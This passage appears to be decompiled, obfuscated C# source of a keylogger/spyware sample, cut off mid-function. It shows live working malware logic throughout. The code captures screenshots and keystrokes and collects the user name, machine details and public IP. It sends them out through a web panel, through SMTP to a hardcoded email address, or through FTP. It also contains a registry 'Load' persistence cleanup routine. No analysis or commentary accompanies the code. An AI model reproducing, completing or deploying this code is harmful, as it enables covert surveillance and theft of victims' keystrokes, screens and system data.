							uint num4 = 2387857776u;
							for (;;)
							{
								uint num2;
								switch ((num2 = (num4 ^ 3041782260u)) % 3u)
								{
								case 1u:
									((IDisposable)enumerator).Dispose();
									num4 = (num2 * 1026070803u ^ 1722978571u);
									continue;
								case 2u:
									goto IL_16D;
								}
								goto Block_15;
							}
						}
						Block_15:;
					}
				}
				text = text2;
				goto IL_415;
			}
			IL_1B1:
			while (als == afg.hp.AmountOfMemory)
			{
				int num5 = -263311300;
				for (;;)
				{
					switch ((num5 ^ -1253185036) % 4)
					{
					case 0:
						goto IL_1B7;
					case 2:
						num5 = -1214678041;
						continue;
					case 3:
						goto IL_1B1;
					}
					break;
				}
				break;
				IL_1B7:
				text = Conversions.ToString(Math.Round(Convert.ToDouble(Conversion.Val(computerInfo.TotalPhysicalMemory)) / 1024.0 / 1024.0, 2)) + " MB";
				goto IL_415;
			}
			if (als == afg.hp.VideocardName)
			{
				string text3;
				try
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator2 = managementObjectSearcher.Get().GetEnumerator();
					for (;;)
					{
						IL_28C:
						uint num6 = 2838882331u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num6 ^ 3041782260u)) % 5u)
							{
							case 0u:
								goto IL_28C;
							case 2u:
								goto IL_223;
							case 3u:
								num6 = (num2 * 1600059207u ^ 3309577061u);
								continue;
							case 4u:
								if (!enumerator2.MoveNext())
								{
									num6 = 2648354037u;
									continue;
								}
								goto IL_223;
							}
							goto Block_18;
							IL_223:
							ManagementObject managementObject2 = (ManagementObject)enumerator2.Current;
							text3 = managementObject2.GetPropertyValue(<Module>.smethod_strings_decryptor(331344 -> "Name"))).ToString();
							num6 = 3500933420u;
						}
					}
					Block_18:;
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator2;
					if (enumerator2 != null)
					{
						for (;;)
						{
							IL_2D6:
							uint num7 = 2423174291u;
							for (;;)
							{
								uint num2;
								switch ((num2 = (num7 ^ 3041782260u)) % 3u)
								{
								case 1u:
									((IDisposable)enumerator2).Dispose();
									num7 = (num2 * 2883319353u ^ 1158629174u);
									continue;
								case 2u:
									goto IL_2D6;
								}
								goto Block_21;
							}
						}
						Block_21:;
					}
				}
				text = text3;
				goto IL_415;
			}
			if (als != afg.hp.VideocardMem)
			{
				goto IL_415;
			}
			string inputStr;
			try
			{
				ManagementObjectCollection.ManagementObjectEnumerator enumerator3 = managementObjectSearcher.Get().GetEnumerator();
				for (;;)
				{
					IL_35E:
					if (enumerator3.MoveNext())
					{
						goto IL_32A;
					}
					int num8 = -418411968;
					for (;;)
					{
						IL_302:
						switch ((num8 ^ -1253185036) % 4)
						{
						case 1:
							goto IL_32A;
						case 2:
							goto IL_35E;
						case 3:
							num8 = -1512830799;
							continue;
						}
						goto Block_23;
					}
					IL_32A:
					ManagementObject managementObject3 = (ManagementObject)enumerator3.Current;
					inputStr = managementObject3.GetPropertyValue(<Module>.smethod_strings_decryptor(331448 -> "AdapterRAM"))).ToString();
					num8 = -1705257138;
					goto IL_302;
				}
				Block_23:;
			}
			finally
			{
				ManagementObjectCollection.ManagementObjectEnumerator enumerator3;
				if (enumerator3 != null)
				{
					for (;;)
					{
						IL_3AC:
						uint num9 = 2408765756u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num9 ^ 3041782260u)) % 3u)
							{
							case 0u:
								goto IL_3AC;
							case 1u:
								((IDisposable)enumerator3).Dispose();
								num9 = (num2 * 3514075280u ^ 2500755964u);
								continue;
							}
							goto Block_27;
						}
					}
					Block_27:;
				}
			}
			text = Conversions.ToString(Math.Round(Convert.ToDouble(Conversion.Val(inputStr)) / 1024.0 / 1024.0, 2)) + " MB";
			IL_3EC:
			int num10 = -1557394457;
			IL_3F1:
			switch ((num10 ^ -1253185036) % 3)
			{
			case 0:
				goto IL_3EC;
			case 1:
				IL_415:
				result = text;
				num10 = -1331686454;
				goto IL_3F1;
			}
		}
		catch (Exception ex)
		{
			result = <Module>.smethod_strings_decryptor(331520 -> "Unknown"));
		}
		return result;
	}

	// Token: 0x06000057 RID: 87 RVA: 0x0001B0AC File Offset: 0x000192AC
	public static void amu()
	{
		try
		{
			string processName = Process.GetCurrentProcess().ProcessName;
			int id = Process.GetCurrentProcess().Id;
			Process[] processesByName = Process.GetProcessesByName(processName);
			for (;;)
			{
				IL_CC:
				uint num = 1221529392u;
				for (;;)
				{
					uint num2;
					int num3;
					Process[] array;
					Process process;
					switch ((num2 = (num ^ 465257475u)) % 8u)
					{
					case 0u:
						goto IL_47;
					case 1u:
						num3 = 0;
						num = (num2 * 1011114366u ^ 3432610952u);
						continue;
					case 2u:
						goto IL_31;
					case 3u:
						array = processesByName;
						num = (num2 * 801046367u ^ 2552563447u);
						continue;
					case 4u:
						process.Kill();
						num = (num2 * 3756746907u ^ 3696446959u);
						continue;
					case 5u:
						if (num3 >= array.Length)
						{
							num = 811167237u;
							continue;
						}
						goto IL_31;
					case 7u:
						goto IL_CC;
					}
					goto Block_4;
					IL_31:
					process = array[num3];
					if (process.Id != id)
					{
						num = 1992868063u;
						continue;
					}
					IL_47:
					checked
					{
						num3++;
						num = 897050054u;
					}
				}
			}
			Block_4:;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000058 RID: 88 RVA: 0x0001B1AC File Offset: 0x000193AC
	public static ImageCodecInfo anp(ImageFormat anr)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num3;
		for (;;)
		{
			IL_82:
			uint num = 863452986u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 1777572186u)) % 7u)
				{
				case 0u:
					if (num3 >= imageEncoders.Length)
					{
						num = 1691657808u;
						continue;
					}
					goto IL_08;
				case 1u:
					num3 = 0;
					num = (num2 * 792515819u ^ 3287045181u);
					continue;
				case 2u:
					goto IL_89;
				case 4u:
					goto IL_24;
				case 5u:
					goto IL_08;
				case 6u:
					goto IL_82;
				}
				goto Block_3;
				IL_08:
				if (imageEncoders[num3].FormatID == anr.Guid)
				{
					num = 607473191u;
					continue;
				}
				IL_24:
				checked
				{
					num3++;
					num = 1407217181u;
				}
			}
		}
		Block_3:
		goto IL_8D;
		IL_89:
		return imageEncoders[num3];
		IL_8D:
		return null;
	}

	// Token: 0x06000059 RID: 89 RVA: 0x0001B248 File Offset: 0x00019448
	public static string anv(string any, string anx, string anw, int anq)
	{
		string result;
		try
		{
			string input = Regex.Split(any, anx)[checked(anq + 1)];
			result = Regex.Split(input, anw)[0];
		}
		catch (Exception ex)
		{
			result = "";
		}
		return result;
	}

	// Token: 0x0600005A RID: 90 RVA: 0x0001B290 File Offset: 0x00019490
	private static void aor(object sender, ElapsedEventArgs e)
	{
		try
		{
			string str = Conversions.ToString(afg.ajw(10));
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str + <Module>.smethod_strings_decryptor(331496 -> ".jpeg"));
			for (;;)
			{
				IL_527:
				uint num = 664139825u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 3071734u)) % 19u)
					{
					case 0u:
					{
						EncoderParameters encoderParameters;
						EncoderParameter encoderParameter;
						encoderParameters.Param[0] = encoderParameter;
						Bitmap bitmap;
						Graphics graphics = Graphics.FromImage(bitmap);
						Graphics graphics2 = graphics;
						Point point = new Point(0, 0);
						Point upperLeftSource = point;
						Point upperLeftDestination = new Point(0, 0);
						Size blockRegionSize;
						graphics2.CopyFromScreen(upperLeftSource, upperLeftDestination, blockRegionSize);
						num = (num2 * 690046848u ^ 4231116654u);
						continue;
					}
					case 1u:
					{
						Size blockRegionSize = new Size(hj.hk.Screen.Bounds.Width, hj.hk.Screen.Bounds.Height);
						Bitmap bitmap = new Bitmap(hj.hk.Screen.Bounds.Width, hj.hk.Screen.Bounds.Height);
						num = (num2 * 1438965235u ^ 402369130u);
						continue;
					}
					case 2u:
					{
						EncoderParameters encoderParameters = new EncoderParameters(1);
						num = (num2 * 1672547741u ^ 2034793477u);
						continue;
					}
					case 3u:
					{
						string[] array;
						array[6] = <Module>.smethod_strings_decryptor(330840 -> "<br>OSFullName:"));
						array[7] = hj.hk.Info.OSFullName;
						array[8] = <Module>.smethod_strings_decryptor(330912 -> "<br>CPU:"));
						num = (num2 * 3018825922u ^ 225392105u);
						continue;
					}
					case 4u:
					{
						System.Drawing.Imaging.Encoder quality = System.Drawing.Imaging.Encoder.Quality;
						ImageCodecInfo encoder = afg.anp(ImageFormat.Jpeg);
						EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
						num = (num2 * 332563549u ^ 1096993561u);
						continue;
					}
					case 6u:
					{
						string[] array;
						string bhk = string.Concat(array);
						num = (num2 * 3975773526u ^ 1840470869u);
						continue;
					}
					case 7u:
					{
						EncoderParameters encoderParameters;
						Bitmap bitmap;
						ImageCodecInfo encoder;
						bitmap.Save(text, encoder, encoderParameters);
						if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(331568 -> "webpanel")), false) == 0)
						{
							num = (num2 * 680774467u ^ 3050453985u);
							continue;
						}
						goto IL_5F;
					}
					case 8u:
						goto IL_4E;
					case 9u:
					{
						string[] array;
						array[13] = afg.cfk;
						array[14] = <Module>.smethod_strings_decryptor(331064 -> "<hr>"));
						num = (num2 * 3752606020u ^ 2524311847u);
						continue;
					}
					case 10u:
						goto IL_527;
					case 11u:
					{
						DateTime now = DateTime.Now;
						string format = <Module>.smethod_strings_decryptor(331152 -> "MM/dd/yyyy HH:mm:ss"));
						string bhj = SystemInformation.UserName + "/" + SystemInformation.ComputerName + <Module>.smethod_strings_decryptor(331256 -> "Screen Capture"));
						string[] array = new string[15];
						array[0] = <Module>.smethod_strings_decryptor(331328 -> "Time:"));
						array[1] = now.ToString(format);
						array[2] = <Module>.smethod_strings_decryptor(331304 -> "<br>UserName:"));
						array[3] = SystemInformation.UserName;
						array[4] = <Module>.smethod_strings_decryptor(330864 -> "<br>ComputerName:"));
						array[5] = SystemInformation.ComputerName;
						num = (num2 * 2961557219u ^ 2404657144u);
						continue;
					}
					case 12u:
					{
						string[] array;
						array[9] = afg.alr(afg.hp.ProcessorName);
						array[10] = <Module>.smethod_strings_decryptor(331016 -> "<br>RAM:"));
						array[11] = afg.alr(afg.hp.AmountOfMemory);
						array[12] = <Module>.smethod_strings_decryptor(330960 -> "<br>IP:"));
						num = (num2 * 3740612020u ^ 286598513u);
						continue;
					}
					case 13u:
					{
						string format2 = <Module>.smethod_strings_decryptor(330600 -> "yyyy_MM_dd_HH_mm_ss"));
						string bdl = text;
						string[] array = new string[]
						{
							<Module>.smethod_strings_decryptor(330672 -> "Screen")),
							afg.cfj.Replace("/", "-"),
							"_",
							DateTime.Now.ToString(format2),
							<Module>.smethod_strings_decryptor(330648 -> ".jpeg"))
						};
						afg.bdk(bdl, string.Concat(array));
						num = (num2 * 1285599877u ^ 2056651008u);
						continue;
					}
					case 14u:
					{
						string bhk;
						string bhj;
						afg.bgq(<Module>.smethod_strings_decryptor(330624 -> "thai@dahger-hinnawi.com")), bhj, bhk, text, "");
						num = (num2 * 1299201965u ^ 1018359037u);
						continue;
					}
					case 15u:
					{
						string text2 = Convert.ToBase64String(File.ReadAllBytes(text));
						afg.bly(string.Format(<Module>.smethod_strings_decryptor(331544 -> "type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}")), new object[]
						{
							<Module>.smethod_strings_decryptor(331104 -> "screenshots")),
							afg.cfg,
							DateTime.Now.ToString(afg.cfh),
							afg.cfj,
							null,
							text2,
							null,
							null,
							null,
							null,
							null,
							null,
							null
						}));
						num = (num2 * 264337272u ^ 3483736692u);
						continue;
					}
					case 16u:
						goto IL_81;
					case 17u:
						goto IL_5F;
					case 18u:
						if (afg.cdu)
						{
							num = (num2 * 1062622101u ^ 1944929131u);
							continue;
						}
						goto IL_4E;
					}
					goto Block_6;
					IL_4E:
					File.Delete(text);
					num = 987361942u;
					continue;
					IL_81:
					if (Operators.CompareString(afg.ceg, "ftp", false) == 0)
					{
						num = 2143845666u;
						continue;
					}
					goto IL_4E;
					IL_5F:
					if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(331208 -> "smtp")), false) != 0)
					{
						goto IL_81;
					}
					num = 1434600066u;
				}
			}
			Block_6:;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600005B RID: 91 RVA: 0x0001B7F8 File Offset: 0x000199F8
	private static void asx(object sender, ElapsedEventArgs e)
	{
		afg.cdt.cbSize = Marshal.SizeOf(afg.cdt);
		for (;;)
		{
			IL_D3:
			uint num = 3150664600u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 3347370311u)) % 6u)
				{
				case 0u:
					afg.cdu = false;
					num = (num2 * 2363637556u ^ 4073724858u);
					continue;
				case 1u:
					afg.cdt.dwTime = 0;
					afg.GetLastInputInfo(ref afg.cdt);
					num = (num2 * 2851258577u ^ 2258760044u);
					continue;
				case 2u:
					if (checked((int)Math.Round((double)(Environment.TickCount - afg.cdt.dwTime) / 1000.0)) > 600)
					{
						num = (num2 * 2085104358u ^ 2838723635u);
						continue;
					}
					goto IL_1E;
				case 3u:
					goto IL_D3;
				case 4u:
					goto IL_1E;
				}
				return;
				IL_1E:
				afg.cdu = true;
				num = 2599140170u;
			}
		}
	}

	// Token: 0x0600005C RID: 92 RVA: 0x0001B8E0 File Offset: 0x00019AE0
	private static void asz()
	{
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += afg.asx;
		for (;;)
		{
			IL_80:
			uint num = 2930043742u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 2602610725u)) % 4u)
				{
				case 0u:
					timer.Start();
					num = (num2 * 165948934u ^ 1795795744u);
					continue;
				case 2u:
					goto IL_80;
				case 3u:
					timer.Enabled = true;
					timer.Interval = 1000.0;
					num = (num2 * 525019202u ^ 3662055979u);
					continue;
				}
				return;
			}
		}
	}

	// Token: 0x0600005D RID: 93 RVA: 0x0001B974 File Offset: 0x00019B74
	private static void atv(object sender, ElapsedEventArgs e)
	{
		if (Operators.CompareString(afg.cdv, "", false) != 0)
		{
			string text;
			for (;;)
			{
				IL_61:
				uint num = 936430010u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 801124419u)) % 3u)
					{
					case 1u:
						text = Path.GetTempPath() + <Module>.smethod_strings_decryptor(330720 -> "/log.tmp"));
						num = (num2 * 1171221239u ^ 1340216377u);
						continue;
					case 2u:
						goto IL_61;
					}
					goto Block_2;
				}
			}
			Block_2:
			DateTime now = DateTime.Now;
			string format = <Module>.smethod_strings_decryptor(330824 -> "MM/dd/yyyy HH:mm:ss"));
			string obj = afg.cdv;
			lock (obj)
			{
				afg.cfr += afg.cdv;
				for (;;)
				{
					IL_DB:
					uint num3 = 37201391u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num3 ^ 801124419u)) % 3u)
						{
						case 0u:
							goto IL_DB;
						case 1u:
							afg.cdv = "";
							num3 = (num2 * 106047901u ^ 2740684649u);
							continue;
						}
						goto Block_8;
					}
				}
				Block_8:;
			}
			string[] array;
			if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(330768 -> "webpanel")), false) == 0)
			{
				try
				{
					if (File.Exists(text))
					{
						for (;;)
						{
							IL_1F9:
							uint num4 = 1607258925u;
							for (;;)
							{
								uint num2;
								switch ((num2 = (num4 ^ 801124419u)) % 4u)
								{
								case 1u:
									File.Delete(text);
									num4 = (num2 * 1911168095u ^ 2357801808u);
									continue;
								case 2u:
									afg.bly(string.Format(<Module>.smethod_strings_decryptor(330360 -> "type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}")), new object[]
									{
										<Module>.smethod_strings_decryptor(330432 -> "keylog")),
										afg.cfg,
										DateTime.Now.ToString(afg.cfh),
										afg.cfj,
										Uri.EscapeDataString(File.ReadAllText(text)),
										null,
										null,
										null,
										null,
										null,
										null,
										null,
										null
									}));
									num4 = (num2 * 144101425u ^ 2409826168u);
									continue;
								case 3u:
									goto IL_1F9;
								}
								goto Block_12;
							}
						}
						Block_12:;
					}
					afg.bly(string.Format(<Module>.smethod_strings_decryptor(330408 -> "type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}")), new object[]
					{
						<Module>.smethod_strings_decryptor(330480 -> "keylog")),
						afg.cfg,
						DateTime.Now.ToString(afg.cfh),
						afg.cfj,
						Uri.EscapeDataString(afg.cfr),
						null,
						null,
						null,
						null,
						null,
						null,
						null,
						null
					}));
					afg.cfr = "";
					return;
				}
				catch (Exception ex)
				{
					for (;;)
					{
						IL_342:
						uint num5 = 879018056u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num5 ^ 801124419u)) % 3u)
							{
							case 0u:
								goto IL_342;
							case 1u:
							{
								string path = text;
								array = new string[]
								{
									<Module>.smethod_strings_decryptor(330456 -> "<br>[(")),
									DateTime.Now.ToString(afg.cfh),
									<Module>.smethod_strings_decryptor(330528 -> ")]<br>")),
									afg.cfr,
									<Module>.smethod_strings_decryptor(330120 -> "<br>"))
								};
								File.AppendAllText(path, string.Concat(array));
								num5 = (num2 * 1536481140u ^ 3396717706u);
								continue;
							}
							}
							goto Block_14;
						}
					}
					Block_14:
					afg.cfr = "";
					return;
				}
			}
			if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(330064 -> "smtp")), false) == 0)
			{
				try
				{
					if (File.Exists(text))
					{
						goto IL_3DC;
					}
					goto IL_6A4;
					uint num6;
					string bhj;
					for (;;)
					{
						IL_648:
						uint num2;
						switch ((num2 = (num6 ^ 801124419u)) % 17u)
						{
						case 0u:
						{
							array[14] = <Module>.smethod_strings_decryptor(329632 -> "<hr>"));
							array[15] = afg.cfr;
							string bhk = string.Concat(array);
							num6 = (num2 * 1580772456u ^ 1812664788u);
							continue;
						}
						case 1u:
							array = new string[6];
							num6 = (num2 * 4136417209u ^ 805378631u);
							continue;
						case 2u:
						{
							string bhk;
							afg.bgq(<Module>.smethod_strings_decryptor(329736 -> "thai@dahger-hinnawi.com")), bhj, bhk, "", "");
							afg.cfr = "";
							num6 = (num2 * 816877238u ^ 278779210u);
							continue;
						}
						case 3u:
							array[13] = afg.cfk;
							num6 = (num2 * 1274814857u ^ 3165496236u);
							continue;
						case 4u:
						{
							string bhj2 = SystemInformation.UserName + "/" + SystemInformation.ComputerName + <Module>.smethod_strings_decryptor(330168 -> "Keystrokes"));
							num6 = (num2 * 3694469957u ^ 1131524971u);
							continue;
						}
						case 5u:
							array[11] = afg.alr(afg.hp.AmountOfMemory);
							array[12] = <Module>.smethod_strings_decryptor(329560 -> "<br>IP:"));
							num6 = (num2 * 358654576u ^ 451710187u);
							continue;
						case 6u:
							array[7] = hj.hk.Info.OSFullName;
							array[8] = <Module>.smethod_strings_decryptor(330024 -> "<br>CPU:"));
							array[9] = afg.alr(afg.hp.ProcessorName);
							num6 = (num2 * 4260047113u ^ 267044017u);
							continue;
						case 7u:
							array[10] = <Module>.smethod_strings_decryptor(329584 -> "<br>RAM:"));
							num6 = (num2 * 1646449136u ^ 827971891u);
							continue;
						case 8u:
							goto IL_6A4;
						case 9u:
							array[5] = SystemInformation.ComputerName;
							array[6] = <Module>.smethod_strings_decryptor(330048 -> "<br>OSFullName:"));
							num6 = (num2 * 1286367856u ^ 3788512313u);
							continue;
						case 10u:
							array[2] = <Module>.smethod_strings_decryptor(329872 -> "<br>UserName:"));
							array[3] = SystemInformation.UserName;
							array[4] = <Module>.smethod_strings_decryptor(329976 -> "<br>ComputerName:"));
							num6 = (num2 * 1401969554u ^ 837082035u);
							continue;
						case 11u:
							File.Delete(text);
							num6 = (num2 * 440812192u ^ 3905524432u);
							continue;
						case 12u:
							array[0] = <Module>.smethod_strings_decryptor(330240 -> "Time:"));
							array[1] = now.ToString(format);
							array[2] = <Module>.smethod_strings_decryptor(330216 -> "<br>IP :"));
							array[3] = afg.cfk;
							num6 = (num2 * 1474046691u ^ 880288221u);
							continue;
						case 13u:
							array[0] = <Module>.smethod_strings_decryptor(329928 -> "Time:"));
							array[1] = now.ToString(format);
							num6 = (num2 * 20177559u ^ 3551526798u);
							continue;
						case 14u:
							goto IL_3DC;
						case 16u:
						{
							array[4] = <Module>.smethod_strings_decryptor(330288 -> "<hr>"));
							array[5] = File.ReadAllText(text);
							string bhk2 = string.Concat(array);
							string bhj2;
							afg.bgq(<Module>.smethod_strings_decryptor(330264 -> "thai@dahger-hinnawi.com")), bhj2, bhk2, "", "");
							num6 = (num2 * 2498858522u ^ 1543173557u);
							continue;
						}
						}
						break;
					}
					return;
					IL_3DC:
					num6 = 1851380758u;
					goto IL_648;
					IL_6A4:
					bhj = SystemInformation.UserName + "/" + SystemInformation.ComputerName + <Module>.smethod_strings_decryptor(329824 -> "Keystrokes"));
					array = new string[16];
					num6 = 1507988710u;
					goto IL_648;
				}
				catch (Exception ex2)
				{
					string path2 = text;
					array = new string[]
					{
						<Module>.smethod_strings_decryptor(329680 -> "<br>[(")),
						DateTime.Now.ToString(afg.cfh),
						<Module>.smethod_strings_decryptor(329784 -> ")]<br>")),
						afg.cfr,
						<Module>.smethod_strings_decryptor(312960 -> "<br>"))
					};
					File.AppendAllText(path2, string.Concat(array));
					for (;;)
					{
						IL_784:
						uint num7 = 1675298588u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num7 ^ 801124419u)) % 3u)
							{
							case 1u:
								afg.cfr = "";
								num7 = (num2 * 2206907821u ^ 3050219805u);
								continue;
							case 2u:
								goto IL_784;
							}
							goto Block_19;
						}
					}
					Block_19:
					return;
				}
			}
			if (Operators.CompareString(afg.ceg, "ftp", false) == 0)
			{
				try
				{
					string format2 = <Module>.smethod_strings_decryptor(312936 -> "yyyy_MM_dd_HH_mm_ss"));
					for (;;)
					{
						IL_B51:
						uint num8 = 1440356484u;
						for (;;)
						{
							uint num2;
							string[] array2;
							switch ((num2 = (num8 ^ 801124419u)) % 10u)
							{
							case 0u:
							{
								array = new string[]
								{
									<Module>.smethod_strings_decryptor(313008 -> "Keystrokes_")),
									afg.cfj.Replace("/", "-"),
									"__",
									DateTime.Now.ToString(format2),
									<Module>.smethod_strings_decryptor(312984 -> ".html"))
								};
								string bcv = string.Concat(array);
								array2 = new string[]
								{
									<Module>.smethod_strings_decryptor(313056 -> "<html>Time:")),
									now.ToString(format),
									<Module>.smethod_strings_decryptor(313160 -> "<br>UserName:")),
									SystemInformation.UserName,
									<Module>.smethod_strings_decryptor(313104 -> "<br>ComputerName:")),
									SystemInformation.ComputerName,
									<Module>.smethod_strings_decryptor(312696 -> "<br>OSFullName:")),
									hj.hk.Info.OSFullName,
									<Module>.smethod_strings_decryptor(312768 -> "<br>CPU:")),
									afg.alr(afg.hp.ProcessorName),
									<Module>.smethod_strings_decryptor(312744 -> "<br>RAM:")),
									afg.alr(afg.hp.AmountOfMemory),
									<Module>.smethod_strings_decryptor(312816 -> "<br>IP:")),
									afg.cfk,
									<Module>.smethod_strings_decryptor(312792 -> "<hr>")),
									File.ReadAllText(text),
									<Module>.smethod_strings_decryptor(312864 -> "</html>"))
								};
								afg.bcu(bcv, string.Concat(array2));
								num8 = (num2 * 2662866507u ^ 3421811874u);
								continue;
							}
							case 2u:
								goto IL_B51;
							case 3u:
								array2[0] = <Module>.smethod_strings_decryptor(312456 -> "Keystrokes_"));
								array2[1] = afg.cfj.Replace("/", "-");
								num8 = (num2 * 3766342998u ^ 4012367043u);
								continue;
							case 4u:
								array2[2] = "__";
								array2[3] = DateTime.Now.ToString(format2);
								array2[4] = <Module>.smethod_strings_decryptor(312400 -> ".html"));
								num8 = (num2 * 2334404793u ^ 3398531363u);
								continue;
							case 5u:
								goto IL_902;
							case 6u:
								afg.cfr = "";
								num8 = (num2 * 1389632701u ^ 3248220554u);
								continue;
							case 7u:
								if (File.Exists(text))
								{
									num8 = (num2 * 2493753338u ^ 1190814137u);
									continue;
								}
								goto IL_902;
							case 8u:
							{
								string bcv2 = string.Concat(array2);
								array = new string[]
								{
									<Module>.smethod_strings_decryptor(312504 -> "<html>Time:")),
									now.ToString(format),
									<Module>.smethod_strings_decryptor(312576 -> "<br>UserName:")),
									SystemInformation.UserName,
									<Module>.smethod_strings_decryptor(312552 -> "<br>ComputerName:")),
									SystemInformation.ComputerName,
									<Module>.smethod_strings_decryptor(312624 -> "<br>OSFullName:")),
									hj.hk.Info.OSFullName,
									<Module>.smethod_strings_decryptor(312600 -> "<br>CPU:")),
									afg.alr(afg.hp.ProcessorName),
									<Module>.smethod_strings_decryptor(312160 -> "<br>RAM:")),
									afg.alr(afg.hp.AmountOfMemory),
									<Module>.smethod_strings_decryptor(312264 -> "<br>IP:")),
									afg.cfk,
									<Module>.smethod_strings_decryptor(312208 -> "<hr>")),
									afg.cfr,
									<Module>.smethod_strings_decryptor(312312 -> "</html>"))
								};
								afg.bcu(bcv2, string.Concat(array));
								num8 = (num2 * 890860698u ^ 1110167937u);
								continue;
							}
							case 9u:
								File.Delete(text);
								num8 = (num2 * 575686473u ^ 3366312347u);
								continue;
							}
							goto Block_22;
							IL_902:
							array2 = new string[5];
							num8 = 342634158u;
						}
					}
					Block_22:;
				}
				catch (Exception ex3)
				{
					string path3 = text;
					string[] array2 = new string[]
					{
						<Module>.smethod_strings_decryptor(312384 -> "<br>[(")),
						DateTime.Now.ToString(afg.cfh),
						<Module>.smethod_strings_decryptor(312360 -> ")]<br>")),
						afg.cfr,
						<Module>.smethod_strings_decryptor(311920 -> "<br>"))
					};
					File.AppendAllText(path3, string.Concat(array2));
					afg.cfr = "";
				}
			}
		}
	}

	// Token: 0x0600005E RID: 94 RVA: 0x0001C5B4 File Offset: 0x0001A7B4
	public static void ayx(object sender, ElapsedEventArgs e)
	{
		try
		{
			afg.cfk = new WebClient().DownloadString(<Module>.smethod_strings_decryptor(311896 -> "http://checkip.amazonaws.com/")));
			NewLateBinding.LateCall(sender, null, <Module>.smethod_strings_decryptor(311968 -> "Stop")), new object[0], null, null, null, true);
			NewLateBinding.LateSet(sender, null, <Module>.smethod_strings_decryptor(312072 -> "Enabled")), new object[]
			{
				false
			}, null, null);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600005F RID: 95 RVA: 0x0001C638 File Offset: 0x0001A838
	public static void axw(object sender, ElapsedEventArgs e)
	{
		try
		{
			afg.bly(string.Format(<Module>.smethod_strings_decryptor(312016 -> "type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}")), new object[]
			{
				<Module>.smethod_strings_decryptor(312120 -> "update")),
				afg.cfg,
				DateTime.Now.ToString(afg.cfh),
				afg.cfj,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			}));
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000060 RID: 96 RVA: 0x0001C6DC File Offset: 0x0001A8DC
	public static void aqz()
	{
		try
		{
			afg.bly(string.Format(<Module>.smethod_strings_decryptor(311680 -> "type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}")), new object[]
			{
				<Module>.smethod_strings_decryptor(311656 -> "update")),
				afg.cfg,
				DateTime.Now.ToString(afg.cfh),
				afg.cfj,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			}));
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_BC:
				uint num = 4021515629u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 2919352871u)) % 3u)
					{
					case 1u:
						num = (num2 * 1777022854u ^ 575732429u);
						continue;
					case 2u:
						goto IL_BC;
					}
					goto Block_3;
				}
			}
			Block_3:;
		}
	}

	// Token: 0x06000061 RID: 97 RVA: 0x0001C7C0 File Offset: 0x0001A9C0
	public static void bcf()
	{
		try
		{
			DateTime now = DateTime.Now;
			afg.bly(string.Format(<Module>.smethod_strings_decryptor(311728 -> "type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}")), new object[]
			{
				<Module>.smethod_strings_decryptor(311704 -> "info")),
				afg.cfg,
				DateTime.Now.ToString(afg.cfh),
				afg.cfj,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			}));
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000062 RID: 98 RVA: 0x0001C86C File Offset: 0x0001AA6C
	private static void bcl(object sender, ElapsedEventArgs e)
	{
		try
		{
			string text = afg.bly(string.Format(<Module>.smethod_strings_decryptor(311776 -> "type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}")), new object[]
			{
				<Module>.smethod_strings_decryptor(311880 -> "uninstall")),
				afg.cfg,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			}));
			if (text.Contains(<Module>.smethod_strings_decryptor(311824 -> "uninstall"))))
			{
				try
				{
					Registry.CurrentUser.OpenSubKey(<Module>.smethod_strings_decryptor(311416 -> "Software\Microsoft\Windows NT\CurrentVersion\Windows")), true).DeleteValue(<Module>.smethod_strings_decryptor(311488 -> "Load")));
				}
				catch (Exception ex)
				{
					for (;;)
					{
						IL_E0:
						uint num = 1556463210u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num ^ 394446179u)) % 3u)
							{
							case 0u:
								goto IL_E0;
							case 2u:
								num = (num2 * 4250830390u ^ 127508265u);
								continue;
							}
							goto Block_8;
